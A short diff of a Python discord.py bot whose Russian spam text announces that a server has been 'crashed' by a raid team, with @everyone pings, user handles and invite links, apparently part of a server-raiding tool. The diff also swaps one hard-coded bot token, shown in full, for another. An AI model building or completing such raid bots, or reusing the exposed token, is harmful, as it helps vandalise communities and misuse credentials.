@@ -6,7 +6,7 @@ import discord
 from asyncio import create_task
 
 prefix = '?' # префикс нашего бота
-token = 'MTAxMDg0NTAyODE3Nzk0ODczMg.G_wCTO.e4a3JaET2okmtLQc6BbipIAC5z4Nc96m64G36M' # токен бота
+token = 'KRjpsML2WLIZrP4ylTCg9b2IFHASybMT' # токен бота
 spamtext = '@everyone @here\nВас крашнул бот им. РейдБата!\nДоброго времени суток. Сервер был крашнут командой РейдБата В общем, привет от TRufelnyCHerv#5127 и Артём Оренбургский#1010. \n Наши сервера: \n TRufelnyCHerv: https://discord.gg/N6rGv6dAK6 \n Оренбургский: https://discord.gg/2kSt92TxHR' # текст спама при краше
 
 intents = Intents.default()
